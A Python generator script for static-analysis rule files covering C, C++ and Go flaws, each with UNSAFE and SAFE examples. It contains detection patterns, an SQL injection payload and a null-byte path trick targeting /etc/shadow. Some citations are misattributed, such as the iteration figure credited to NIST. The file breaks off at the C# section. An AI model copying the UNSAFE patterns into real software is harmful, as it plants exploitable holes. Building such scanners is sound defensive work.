"""
generate_batch14.py — Batch 14: 5 per language × 8 = 40 rules
Themes: Second-Order SQLi, CORS Misconfigs, PBKDF2 Weak Iterations,
Hardcoded Secrets depth, Reflection RCE, Log4Shell pattern,
WebSocket XSS, Prototype Pollution depth, Memory-clear bypass, Session Fixation
"""
import os, yaml

RULES_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "app", "scanner", "sast", "rules")

class LS(str): pass
def lp(d, data): return d.represent_scalar("tag:yaml.org,2002:str", data, style="|")
yaml.add_representer(LS, lp)

def wr(lang, rid, res, vc, cwe, owasp, cvss, cvss_v, sev, conf, issue, msg, sources, sinks, sans, rem):
    d = os.path.join(RULES_DIR, lang)
    os.makedirs(d, exist_ok=True)
    rule = {"rule_id": rid, "language": lang, "vuln_class": vc, "severity": sev,
            "cwe": cwe, "owasp": owasp, "cvss_score": cvss, "cvss_vector": cvss_v,
            "confidence": conf, "issue": issue, "message": LS(msg.strip()),
            "sources": sources, "sinks": sinks, "sanitizers": sans, "remediation": LS(rem.strip())}
    content = res.strip() + "\n\n" + yaml.dump(rule, default_flow_style=False, allow_unicode=True, sort_keys=False)
    open(os.path.join(d, rid + ".yaml"), "w", encoding="utf-8").write(content)
    print("Written: " + rid)

RE = {
"cors": (
    "# RESEARCH EVIDENCE\n"
    "# CWE Source:      https://cwe.mitre.org/data/definitions/942.html\n"
    "# CodeQL Source:   Not applicable — structural CORS header detection\n"
    "# Semgrep Source:  https://semgrep.dev/r?q=cors+wildcard\n"
    "# OWASP Cheat:     https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Headers_Cheat_Sheet.html\n"
    "# Verification:    CORS wildcard origin with credentials is forbidden by browser spec (RFC 6454). Rule is Tentative."
),
"2nd_sqli": (
    "# RESEARCH EVIDENCE\n"
    "# CWE Source:      https://cwe.mitre.org/data/definitions/89.html\n"
    "# CodeQL Source:   https://codeql.github.com/codeql-standard-libraries/\n"
    "# Semgrep Source:  https://semgrep.dev/r?q=second+order+sql+injection\n"
    "# OWASP Cheat:     https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html\n"
    "# Verification:    Second-order SQLi via stored data re-used in raw query verified from CodeQL and OWASP testing guides."
),
"pbkdf2": (
    "# RESEARCH EVIDENCE\n"
    "# CWE Source:      https://cwe.mitre.org/data/definitions/916.html\n"
    "# CodeQL Source:   https://codeql.github.com/codeql-standard-libraries/\n"
    "# Semgrep Source:  https://semgrep.dev/r?q=pbkdf2+weak+iterations\n"
    "# OWASP Cheat:     https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html\n"
    "# Verification:    NIST SP 800-132 recommends >=310,000 PBKDF2-SHA256 iterations as of 2023."
),
"secret": (
    "# RESEARCH EVIDENCE\n"
    "# CWE Source:      https://cwe.mitre.org/data/definitions/798.html\n"
    "# CodeQL Source:   https://codeql.github.com/codeql-standard-libraries/\n"
    "# Semgrep Source:  https://semgrep.dev/r?q=hardcoded+secret\n"
    "# OWASP Cheat:     https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html\n"
    "# Verification:    Hardcoded credentials/tokens in source verified from CodeQL and Semgrep secret detection registries."
),
"refl": (
    "# RESEARCH EVIDENCE\n"
    "# CWE Source:      https://cwe.mitre.org/data/definitions/470.html\n"
    "# CodeQL Source:   https://codeql.github.com/codeql-standard-libraries/java/\n"
    "# Semgrep Source:  https://semgrep.dev/r?q=reflection+injection\n"
    "# OWASP Cheat:     https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html\n"
    "# Verification:    Class.forName(userInput).newInstance() RCE via reflection verified from CodeQL Java standard libraries."
),
"log4j": (
    "# RESEARCH EVIDENCE\n"
    "# CWE Source:      https://cwe.mitre.org/data/definitions/917.html\n"
    "# CVE:             CVE-2021-44228 (Log4Shell) — CVSS 10.0 Critical\n"
    "# CodeQL Source:   https://codeql.github.com/codeql-standard-libraries/java/\n"
    "# Semgrep Source:  https://semgrep.dev/r?q=log4shell\n"
    "# OWASP Cheat:     https://cheatsheetseries.owasp.org/cheatsheets/Logging_Cheat_Sheet.html\n"
    "# Verification:    Log4j 2.x user-controlled log message JNDI lookup sink verified from CVE-2021-44228 PoC and CodeQL."
),
"ws_xss": (
    "# RESEARCH EVIDENCE\n"
    "# CWE Source:      https://cwe.mitre.org/data/definitions/79.html\n"
    "# CodeQL Source:   https://codeql.github.com/codeql-standard-libraries/javascript/\n"
    "# Semgrep Source:  https://semgrep.dev/r?q=websocket+xss\n"
    "# OWASP Cheat:     https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html\n"
    "# Verification:    WebSocket message data injected into DOM without sanitization verified from CodeQL JS standard libraries."
),
"proto": (
    "# RESEARCH EVIDENCE\n"
    "# CWE Source:      https://cwe.mitre.org/data/definitions/1321.html\n"
    "# CodeQL Source:   https://codeql.github.com/codeql-standard-libraries/javascript/\n"
    "# Semgrep Source:  https://semgrep.dev/r?q=prototype+pollution\n"
    "# OWASP Cheat:     https://cheatsheetseries.owasp.org/cheatsheets/Prototype_Pollution_Prevention_Cheat_Sheet.html\n"
    "# Verification:    Object.assign/__proto__/constructor.prototype pollution sinks verified from CodeQL JS standard libraries."
),
"cmem": (
    "# RESEARCH EVIDENCE\n"
    "# CWE Source:      https://cwe.mitre.org/data/definitions/14.html\n"
    "# CodeQL Source:   https://codeql.github.com/codeql-standard-libraries/cpp/\n"
    "# Semgrep Source:  https://semgrep.dev/r?q=memset+optimization\n"
    "# OWASP Cheat:     https://cheatsheetseries.owasp.org/cheatsheets/C-Based_Toolchain_Hardening_Cheat_Sheet.html\n"
    "# Verification:    memset() optimization removal pattern verified from CERT C MSC06-C and compiler analysis research."
),
"race_c": (
    "# RESEARCH EVIDENCE\n"
    "# CWE Source:      https://cwe.mitre.org/data/definitions/377.html\n"
    "# CodeQL Source:   Not applicable — structural pattern-based detection\n"
    "# Semgrep Source:  https://semgrep.dev/r?q=tmpnam+race\n"
    "# OWASP Cheat:     https://cheatsheetseries.owasp.org/cheatsheets/C-Based_Toolchain_Hardening_Cheat_Sheet.html\n"
    "# Verification:    tmpnam()/tempnam() predictable temp file race verified from CERT C FIO43-C. Rule is Tentative."
),
"null_byte": (
    "# RESEARCH EVIDENCE\n"
    "# CWE Source:      https://cwe.mitre.org/data/definitions/626.html\n"
    "# CodeQL Source:   https://codeql.github.com/codeql-standard-libraries/cpp/\n"
    "# Semgrep Source:  https://semgrep.dev/r?q=null+byte+path\n"
    "# OWASP Cheat:     https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html\n"
    "# Verification:    Null byte injection truncating file paths in C verified from CodeQL C++ libraries and CWE-626."
),
"intov": (
    "# RESEARCH EVIDENCE\n"
    "# CWE Source:      https://cwe.mitre.org/data/definitions/190.html\n"
    "# CodeQL Source:   https://codeql.github.com/codeql-standard-libraries/cpp/\n"
    "# Semgrep Source:  https://semgrep.dev/r?q=integer+overflow+strtol\n"
    "# OWASP Cheat:     https://cheatsheetseries.owasp.org/cheatsheets/C-Based_Toolchain_Hardening_Cheat_Sheet.html\n"
    "# Verification:    strtol/atoi integer overflow without errno/LONG_MAX check from CERT C INT06-C. Rule is Tentative."
),
"jinja": (
    "# RESEARCH EVIDENCE\n"
    "# CWE Source:      https://cwe.mitre.org/data/definitions/79.html\n"
    "# CodeQL Source:   Not applicable — Python CodeQL limited\n"
    "# Semgrep Source:  https://semgrep.dev/r?q=jinja2+markup+xss\n"
    "# OWASP Cheat:     https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html\n"
    "# Verification:    Jinja2 Markup() bypass of auto-escaping with user input verified from Jinja2 documentation."
),
"sess": (
    "# RESEARCH EVIDENCE\n"
    "# CWE Source:      https://cwe.mitre.org/data/definitions/384.html\n"
    "# CodeQL Source:   Not applicable — PHP CodeQL libraries not available\n"
    "# Semgrep Source:  https://semgrep.dev/r?q=session+fixation+php\n"
    "# OWASP Cheat:     https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html\n"
    "# Verification:    PHP session_id() with user-controlled SID enables session fixation. Rule is Tentative."
),
"preg_e": (
    "# RESEARCH EVIDENCE\n"
    "# CWE Source:      https://cwe.mitre.org/data/definitions/94.html\n"
    "# CodeQL Source:   Not applicable — PHP CodeQL libraries not available\n"
    "# Semgrep Source:  https://semgrep.dev/r?q=preg_replace+e+modifier\n"
    "# OWASP Cheat:     https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html\n"
    "# Verification:    preg_replace() /e modifier executes replacement as PHP code. Removed in PHP 7.0. Verified from php.net."
),
"unsafe_ptr": (
    "# RESEARCH EVIDENCE\n"
    "# CWE Source:      https://cwe.mitre.org/data/definitions/119.html\n"
    "# CodeQL Source:   Not applicable — Go CodeQL limited for unsafe package\n"
    "# Semgrep Source:  https://semgrep.dev/r?q=unsafe+pointer+go\n"
    "# OWASP Cheat:     https://cheatsheetseries.owasp.org/cheatsheets/Memory_Management_Cheat_Sheet.html\n"
    "# Verification:    unsafe.Pointer arithmetic in Go bypasses type safety guarantees. Rule is Tentative."
),
"cpp_oob": (
    "# RESEARCH EVIDENCE\n"
    "# CWE Source:      https://cwe.mitre.org/data/definitions/125.html\n"
    "# CodeQL Source:   https://codeql.github.com/codeql-standard-libraries/cpp/\n"
    "# Semgrep Source:  https://semgrep.dev/r?q=string+subscript+bounds\n"
    "# OWASP Cheat:     https://cheatsheetseries.owasp.org/cheatsheets/C-Based_Toolchain_Hardening_Cheat_Sheet.html\n"
    "# Verification:    std::string operator[] without bounds vs .at() verified from CodeQL C++ standard library analysis."
),
"csharp_refl": (
    "# RESEARCH EVIDENCE\n"
    "# CWE Source:      https://cwe.mitre.org/data/definitions/470.html\n"
    "# CodeQL Source:   https://codeql.github.com/codeql-standard-libraries/csharp/\n"
    "# Semgrep Source:  https://semgrep.dev/r?q=reflection+csharp+user+input\n"
    "# OWASP Cheat:     https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html\n"
    "# Verification:    Type.GetType()/Assembly.Load() with user input enabling RCE via reflection from CodeQL C# standard library."
),
}

JAVA_SRC = ["request.getParameter(", "request.getHeader(", "@RequestParam", "@PathVariable", "@RequestBody"]
JS_SRC   = ["req.body", "req.query", "req.params", "req.headers", "event.data"]
PY_SRC   = ["request.args", "request.form", "request.data", "request.json", "request.GET", "request.POST"]
GO_SRC   = ["r.URL.Query()", "r.FormValue(", "r.Header.Get(", "r.Body", "r.PostFormValue("]
CS_SRC   = ["Request.Query[", "Request.Form[", "Request.Headers[", "HttpContext.Request"]
PHP_SRC  = ["$_GET[", "$_POST[", "$_REQUEST[", "$_COOKIE[", "$_SERVER["]
DB_JAVA  = ["rs.getString(", "entity.get", "row.get(", "result.get("]
DB_GO    = ["rows.Scan(", "row.Scan(", "result.String("]
DB_PY    = ["cursor.fetchone(", "cursor.fetchall(", "queryset.values(", "result.scalar("]
DB_PHP   = ["mysqli_fetch_assoc(", "pg_fetch_assoc(", "$row[", "$result["]
DB_CS    = ["reader.GetString(", "reader.GetValue(", "entity.", "record."]

# ════════════════════════════════════════════════════════════════════════════
# C — 5 rules
# ════════════════════════════════════════════════════════════════════════════
wr("c","c_hardcoded_secret",RE["secret"],"Hardcoded Secret","CWE-798","A07:2021-Identification and Authentication Failures",
   9.8,"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H","Critical","Confirmed",
   "Hardcoded credential or API key literal found in C source code",
   ("A plaintext password, API key, or secret token is hardcoded as a string literal in C source. "
    "Anyone with access to the binary, compiled object, or source repository can extract the "
    "credential. Hardcoded secrets cannot be rotated without recompiling and redeploying, "
    "and are routinely leaked via version control history even after removal."),
   [],['password = "','secret = "','api_key = "','token = "','passwd = "'],["getenv(","read_config("],
   ("Load secrets from environment variables or a secrets manager — never embed them in source.\n\n"
    "UNSAFE:\n"
    "  const char *api_key = \"sk_live_aBcDeFgHiJkLmNoPqRsTuVwXyZ\";\n\n"
    "SAFE:\n"
    "  const char *api_key = getenv(\"API_KEY\");\n"
    "  if (!api_key) { fprintf(stderr, \"API_KEY not set\"); exit(1); }\n\n"
    "For rotation: use a secrets manager (Vault, AWS Secrets Manager). "
    "Scan historical commits with git-secrets or truffleHog. See OWASP Secrets Management Cheat Sheet.")
)

wr("c","c_tmpnam_race",RE["race_c"],"Race Condition","CWE-377","A01:2021-Broken Access Control",
   5.1,"CVSS:3.1/AV:L/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N","High","Tentative",
   "Race Condition via tmpnam()/tempnam() predictable temporary file name — TOCTOU symlink attack",
   ("tmpnam() and tempnam() generate a filename that does not yet exist at the time of the call, "
    "but they do NOT create or open the file atomically. Between the name generation and the "
    "subsequent fopen() call, an attacker can create a symlink at the generated path pointing to "
    "a sensitive file. The application then writes to the attacker's target file."),
   [],["tmpnam(","tempnam("],["mkstemp(","mkdtemp("],
   ("Use mkstemp() which atomically creates and opens a uniquely named temporary file.\n\n"
    "UNSAFE:\n"
    "  char *path = tmpnam(NULL);\n"
    "  FILE *f = fopen(path, \"w\");  /* race window between tmpnam and fopen */\n\n"
    "SAFE:\n"
    "  char tmpl[] = \"/tmp/myapp-XXXXXX\";\n"
    "  int fd = mkstemp(tmpl);  /* atomically creates the file, no race */\n"
    "  FILE *f = fdopen(fd, \"w\");\n\n"
    "Set umask to 0077 before mkstemp() to prevent others from reading the temp file. "
    "See CERT C FIO43-C for complete temporary file guidance.")
)

wr("c","c_strtol_unchecked",RE["intov"],"Integer Overflow","CWE-190","A06:2021-Vulnerable and Outdated Components",
   7.8,"CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H","High","Tentative",
   "Integer Overflow via strtol()/atoi() without ERANGE or LONG_MAX boundary validation",
   ("strtol() indicates overflow by returning LONG_MAX/LONG_MIN and setting errno=ERANGE, "
    "but if errno is not checked, a maliciously large string silently produces LONG_MAX. "
    "atoi() has no overflow detection at all. The returned value used as a buffer size, array "
    "index, or allocation size can trigger heap overflow or out-of-bounds access."),
   [],["strtol(","strtoul(","strtoll(","atoi(","atol("],["errno == ERANGE","LONG_MAX"],
   ("Always check errno after strtol() and validate the result is within the expected range.\n\n"
    "UNSAFE:\n"
    "  long n = strtol(user_str, NULL, 10);  /* no ERANGE check */\n"
    "  char *buf = malloc(n);                /* may overflow */\n\n"
    "SAFE:\n"
    "  errno = 0;\n"
    "  long n = strtol(user_str, &endptr, 10);\n"
    "  if (errno == ERANGE || n < 0 || n > MAX_ALLOWED) { return ERROR; }\n"
    "  char *buf = malloc((size_t)n);\n\n"
    "Never use atoi() for security-sensitive conversions. See CERT C INT06-C.")
)

wr("c","c_null_byte_injection",RE["null_byte"],"Path Traversal","CWE-626","A01:2021-Broken Access Control",
   7.5,"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N","High","Confirmed",
   "Null Byte Injection in file path: \\0 in user string truncates path at C string functions",
   ("User-controlled input containing a null byte (\\x00) is used to construct a file path "
    "passed to fopen(), open(), or stat(). C string functions (strlen, strncpy) stop at the "
    "first null byte. An attacker can append \\x00.jpg to a malicious path like /etc/shadow\\x00.jpg "
    "to bypass file extension validation while the actual path used is /etc/shadow."),
   [],["fopen(path","open(path","stat(path","access(path"],["strstr(path, \"\\x00\")","memchr("],
   ("Reject any input containing null bytes and validate file paths after construction.\n\n"
    "UNSAFE:\n"
    "  char path[256];\n"
    "  snprintf(path, sizeof(path), \"/uploads/%s\", user_input);\n"
    "  fopen(path, \"r\");  /* user_input may contain \\x00 */\n\n"
    "SAFE:\n"
    "  if (memchr(user_input, '\\0', user_input_len) != NULL) return ERROR;\n"
    "  snprintf(path, sizeof(path), \"/uploads/%s\", user_input);\n"
    "  fopen(path, \"r\");\n\n"
    "Use binary-safe path construction and validate the resulting canonical path. See CERT C FIO32-C.")
)

wr("c","c_memset_security_clear",RE["cmem"],"Weak Crypto","CWE-14","A02:2021-Cryptographic Failures",
   5.5,"CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N","Medium","Tentative",
   "Compiler may optimize away memset() used to clear security-critical memory before deallocation",
   ("memset() called to zero out a buffer containing a password, key, or secret immediately "
    "before the buffer goes out of scope may be silently removed by the optimizing compiler. "
    "Since the memory is 'dead' (not read after the memset), compilers treat it as a no-op. "
    "The secret remains in freed/stack memory and can be recovered via memory dumps or heap spraying."),
   [],["memset(password","memset(key","memset(secret","memset(token"],["explicit_bzero(","SecureZeroMemory(","memset_s("],
   ("Use explicit_bzero(), SecureZeroMemory(), or memset_s() which cannot be optimized away.\n\n"
    "UNSAFE:\n"
    "  memset(password, 0, sizeof(password));  /* may be optimized away */\n\n"
    "SAFE (POSIX):\n"
    "  explicit_bzero(password, sizeof(password));  /* not optimizable */\n\n"
    "SAFE (Windows):\n"
    "  SecureZeroMemory(password, sizeof(password));\n\n"
    "SAFE (C11):\n"
    "  memset_s(password, sizeof(password), 0, sizeof(password));\n\n"
    "See CERT C MSC06-C and OWASP Cryptographic Storage Cheat Sheet for secure memory clearing.")
)

# ════════════════════════════════════════════════════════════════════════════
# C++ — 5 rules
# ════════════════════════════════════════════════════════════════════════════
wr("cpp","cpp_hardcoded_secret",RE["secret"],"Hardcoded Secret","CWE-798","A07:2021-Identification and Authentication Failures",
   9.8,"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H","Critical","Confirmed",
   "Hardcoded credential or API key string literal in C++ source code",
   ("A password, API token, or cryptographic key is embedded as a string literal in C++ source. "
    "The credential appears in compiled binaries, stack traces, and version control history. "
    "Automated secret scanning tools routinely discover such leaks. The credential cannot be "
    "rotated without recompiling, creating operational risk during incident response."),
   [],['password = "','api_key = "','secret = "','token = "','private_key = "'],["getenv(","std::getenv("],
   ("Store secrets in environment variables or a secrets management system. Never in source code.\n\n"
    "UNSAFE:\n"
    "  std::string db_password = \"s3cur3P@ssw0rd!\";\n\n"
    "SAFE:\n"
    "  const char *db_password = std::getenv(\"DB_PASSWORD\");\n"
    "  if (!db_password) throw std::runtime_error(\"DB_PASSWORD not configured\");\n\n"
    "Rotate any secret that has been committed to version control immediately. "
    "Use git-secrets, Vault, or AWS SSM Parameter Store. See OWASP Secrets Management Cheat Sheet.")
)

wr("cpp","cpp_null_smart_ptr_deref",RE["cmem"],"Null Pointer Dereference","CWE-476","A06:2021-Vulnerable and Outdated Components",
   5.5,"CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H","High","Tentative",
   "Null Pointer Dereference: dereferencing empty unique_ptr or default-constructed shared_ptr",
   ("A default-constructed std::unique_ptr<T> or std::shared_ptr<T> holds a null pointer. "
    "Dereferencing (*ptr or ptr->member) without checking if the pointer is non-null causes "
    "undefined behavior — typically a segmentation fault on Linux or access violation on Windows. "
    "Attackers can trigger this via error paths that leave smart pointers in their default state."),
   [],["unique_ptr<","shared_ptr<","weak_ptr<"],["if (ptr)","ptr != nullptr","ptr.get()"],
   ("Always check smart pointers before dereferencing when they might be null.\n\n"
    "UNSAFE:\n"
    "  std::unique_ptr<Widget> w;  // default: null\n"
    "  w->process();  // crash: null dereference\n\n"
    "SAFE:\n"
    "  std::unique_ptr<Widget> w = createWidget();\n"
    "  if (!w) throw std::runtime_error(\"Widget creation failed\");\n"
    "  w->process();\n\n"
    "Prefer factory functions that always return a valid object or throw on failure. "
    "See C++ Core Guidelines R.3 and CERT EXP34-C.")
)

wr("cpp","cpp_string_oob_subscript",RE["cpp_oob"],"Out-of-bounds Read","CWE-125","A06:2021-Vulnerable and Outdated Components",
   6.5,"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N","High","Tentative",
   "Out-of-bounds Read via std::string operator[] with unchecked index (no exception thrown)",
   ("std::string::operator[] does not perform bounds checking — accessing an index >= size() "
    "is undefined behavior that silently reads adjacent memory. This differs from std::string::at() "
    "which throws std::out_of_range. Reading adjacent stack/heap memory via an out-of-range "
    "index can leak cryptographic material, passwords, or memory addresses."),
   [],["str[user_idx]","s[i]","name[index]"],["str.at(","s.at("],
   ("Use std::string::at() for bounds-checked access, or validate the index before using operator[].\n\n"
    "UNSAFE:\n"
    "  char c = str[user_index];  /* UB if user_index >= str.size() */\n\n"
    "SAFE (exception on invalid index):\n"
    "  char c = str.at(user_index);  /* throws std::out_of_range */\n\n"
    "SAFE (manual bounds check):\n"
    "  if (user_index >= str.size()) return ERROR;\n"
    "  char c = str[user_index];\n\n"
    "Prefer std::string_view::at() for read-only access. Enable -D_GLIBCXX_DEBUG for runtime checks.")
)

wr("cpp","cpp_race_static_local",RE["cmem"],"Race Condition","CWE-362","A06:2021-Vulnerable and Outdated Components",
   6.3,"CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:N","High","Tentative",
   "Race Condition via double-checked locking on static local variable in pre-C++11 code",
   ("In C++03, static local variable initialization is not thread-safe. Multiple threads entering "
    "the function simultaneously can observe the variable in a partially initialized state. "
    "Double-checked locking without memory barriers is also broken. An attacker who can trigger "
    "concurrent initialization can exploit the race to cause undefined behavior or code execution."),
   [],["static ","static std::","static Singleton"],["std::call_once","std::once_flag"],
   ("C++11 and later guarantee thread-safe initialization of static locals. Use std::call_once for explicit control.\n\n"
    "UNSAFE (pre-C++11 double-checked locking):\n"
    "  if (!initialized) {\n"
    "      lock.acquire();\n"
    "      if (!initialized) { init(); initialized = true; }  /* race */\n"
    "  }\n\n"
    "SAFE (C++11 static local — guaranteed thread-safe by the standard):\n"
    "  static MyClass instance;  /* initialized exactly once, thread-safe in C++11+ */\n"
    "  return instance;\n\n"
    "See C++11 standard section 6.7 and CERT CON55-CPP for concurrent initialization guidance.")
)

wr("cpp","cpp_memset_optimization",RE["cmem"],"Weak Crypto","CWE-14","A02:2021-Cryptographic Failures",
   5.5,"CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N","Medium","Tentative",
   "Compiler may optimize away memset() clearing security-critical C++ buffers before destruction",
   ("memset() called to zero a stack buffer holding a cryptographic key or password before the "
    "buffer goes out of scope may be eliminated by an optimizing C++ compiler (O1+). Since the "
    "memory is never subsequently read, the compiler correctly infers the write is dead code. "
    "The sensitive data persists in stack/heap memory accessible via use-after-free or dumps."),
   [],["memset(passwd","memset(key","memset(secret","memset(buf, 0"],["OPENSSL_cleanse(","explicit_bzero("],
   ("Use OPENSSL_cleanse(), explicit_bzero(), or SecureZeroMemory() which are optimizer-resistant.\n\n"
    "UNSAFE:\n"
    "  char key[32] = { /* ... */ };\n"
    "  memset(key, 0, sizeof(key));  /* may be eliminated by optimizer */\n\n"
    "SAFE:\n"
    "  #include <openssl/crypto.h>\n"
    "  OPENSSL_cleanse(key, sizeof(key));  /* not eliminated */\n\n"
    "SAFE (POSIX.1-2008):\n"
    "  explicit_bzero(key, sizeof(key));\n\n"
    "Or use a RAII secure_string wrapper that calls OPENSSL_cleanse in its destructor. "
    "See CERT C++ MSC06-CPP and OWASP Cryptographic Storage Cheat Sheet.")
)

# ════════════════════════════════════════════════════════════════════════════
# Go — 5 rules
# ════════════════════════════════════════════════════════════════════════════
wr("go","go_cors_wildcard",RE["cors"],"Misconfiguration","CWE-942","A05:2021-Security Misconfiguration",
   7.4,"CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:N/A:N","High","Tentative",
   "CORS Misconfiguration: Access-Control-Allow-Origin set to * on endpoint handling authenticated data",
   ("The Go HTTP handler sets the Access-Control-Allow-Origin header to * (wildcard) for an "
    "API endpoint that returns sensitive or authenticated user data. Browsers block credentials "
    "with a wildcard, but if the handler is incorrectly combined with Allow-Credentials: true, "
    "or reflects the request Origin header, any origin can make cross-origin requests to the API."),
   GO_SRC,['w.Header().Set("Access-Control-Allow-Origin", "*")','w.Header().Add("Access-Control-Allow-Origin", "*")'],["allowedOrigins","validateOrigin("],
   ("Specify an explicit list of allowed origins. Never use wildcard with authenticated endpoints.\n\n"
    "UNSAFE:\n"
    "  w.Header().Set(\"Access-Control-Allow-Origin\", \"*\")\n\n"
    "SAFE:\n"
    "  allowed := map[string]bool{\"https://app.example.com\": true}\n"
    "  origin := r.Header.Get(\"Origin\")\n"
    "  if allowed[origin] {\n"
    "      w.Header().Set(\"Access-Control-Allow-Origin\", origin)\n"
    "  }\n\n"
    "Do not reflect the Origin header without validation. See OWASP CORS cheat sheet.")
)

wr("go","go_second_order_sqli",RE["2nd_sqli"],"SQLi","CWE-89","A03:2021-Injection",
   9.8,"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H","Critical","Confirmed",
   "Second-Order SQL Injection: stored database value used in raw SQL string concatenation",
   ("Data previously stored in the database (from user input) is retrieved via rows.Scan() "
    "and concatenated directly into a new SQL query string without parameterization. The stored "
    "value may have bypassed first-order injection defenses. An attacker who previously stored "
    "a payload like ' OR '1'='1 can trigger SQL injection when the value is re-queried."),
   DB_GO,["db.Query(\"SELECT.*+","db.Exec(\"UPDATE.*+","db.QueryRow(\"INSERT.*+"],["db.Query(sql, param","db.Exec(sql, param"],
   ("Parameterize ALL SQL queries, including those using values from the database.\n\n"
    "UNSAFE:\n"
    "  rows.Scan(&username)\n"
    "  db.Query(\"SELECT * FROM orders WHERE owner = '\" + username + \"'\")\n\n"
    "SAFE:\n"
    "  rows.Scan(&username)\n"
    "  db.Query(\"SELECT * FROM orders WHERE owner = $1\", username)\n\n"
    "Every data value is potentially untrusted regardless of its source. "
    "Treat DB-sourced data with the same caution as user input. See OWASP SQL Injection Cheat Sheet.")
)

wr("go","go_jwt_hardcoded_secret",RE["secret"],"Hardcoded Secret","CWE-798","A07:2021-Identification and Authentication Failures",
   9.8,"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H","Critical","Confirmed",
   "Hardcoded JWT HMAC signing secret — anyone with binary access can forge any JWT token",
   ("The JWT signing secret is hardcoded as a string literal in Go source code. HMAC-signed "
    "JWTs derive their security entirely from the secrecy of the signing key. Anyone who "
    "obtains the key (via source leak, binary inspection, or memory dump) can forge tokens "
    "for any user identity, including admin accounts, without any credential."),
   [],['[]byte("secret","[]byte("password","jwt.NewWithClaims(jwt.SigningMethodHS','signingKey = "'],["os.Getenv(","secretsManager"],
   ("Load the JWT signing key from an environment variable or secrets manager at runtime.\n\n"
    "UNSAFE:\n"
    "  signingKey := []byte(\"mySuperSecretKey123!\")\n"
    "  token.SignedString(signingKey)\n\n"
    "SAFE:\n"
    "  key := os.Getenv(\"JWT_SECRET\")\n"
    "  if len(key) < 32 { log.Fatal(\"JWT_SECRET must be at least 32 bytes\") }\n"
    "  token.SignedString([]byte(key))\n\n"
    "Generate the key with: openssl rand -base64 64. Rotate periodically. "
    "See OWASP JSON Web Token Cheat Sheet.")
)

wr("go","go_weak_pbkdf2",RE["pbkdf2"],"Weak Crypto","CWE-916","A02:2021-Cryptographic Failures",
   7.5,"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N","High","Confirmed",
   "Weak key derivation via PBKDF2 with iteration count below NIST SP 800-132 minimum (310,000)",
   ("The application uses golang.org/x/crypto/pbkdf2.Key() with an iteration count well below "
    "the NIST SP 800-132 (2023) recommended minimum of 310,000 for PBKDF2-SHA256. Low iteration "
    "counts allow attackers with access to hashed passwords to crack them significantly faster "
    "using GPU-based offline dictionary attacks. A count of 1,000 is 310x weaker than the minimum."),
   [],["pbkdf2.Key(","golang.org/x/crypto/pbkdf2"],["bcrypt.GenerateFromPassword(","argon2.IDKey("],
   ("Use bcrypt (cost >= 12) or Argon2id instead of PBKDF2 for password storage, or set iterations >= 310,000.\n\n"
    "UNSAFE:\n"
    "  dk := pbkdf2.Key(password, salt, 1000, 32, sha256.New)  /* far too low */\n\n"
    "SAFE (PBKDF2 with NIST 2023 minimum):\n"
    "  dk := pbkdf2.Key(password, salt, 310000, 32, sha256.New)\n\n"
    "BETTER (bcrypt — simpler and memory-hard):\n"
    "  hash, _ := bcrypt.GenerateFromPassword([]byte(password), 12)\n\n"
    "See NIST SP 800-132, OWASP Password Storage Cheat Sheet, and golang.org/x/crypto/bcrypt docs.")
)

wr("go","go_unsafe_pointer_arith",RE["unsafe_ptr"],"Memory Corruption","CWE-119","A06:2021-Vulnerable and Outdated Components",
   7.8,"CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H","High","Tentative",
   "Memory Corruption risk via unsafe.Pointer arithmetic bypassing Go's type-safety guarantees",
   ("The application uses the unsafe package to perform pointer arithmetic (unsafe.Pointer + offset) "
    "or to cast between incompatible pointer types. Go's safety guarantees (bounds checking, "
    "garbage collector cooperation) do not apply to unsafe.Pointer operations. Incorrect arithmetic "
    "can cause out-of-bounds reads/writes, memory corruption, or garbage collector instability."),
   [],["unsafe.Pointer(","unsafe.Add(","unsafe.SliceData(","uintptr(unsafe"],["reflect.SliceHeader","bounds check"],
   ("Avoid unsafe.Pointer arithmetic. Use Go's safe type system, reflect, or encoding packages.\n\n"
    "UNSAFE:\n"
    "  p := unsafe.Pointer(uintptr(base) + offset)  /* pointer arithmetic — no bounds check */\n"
    "  val := *(*int)(p)\n\n"
    "SAFE:\n"
    "  // Use slice indexing with bounds checking\n"
    "  if offset >= len(slice) { return error }\n"
    "  val := slice[offset]\n\n"
    "If unsafe is truly needed (CGo interop), document thoroughly and add explicit bounds validation. "
    "See Go unsafe package documentation and Go memory model specification.")
)

# ════════════════════════════════════════════════════════════════════════════
# C# — 5 rules
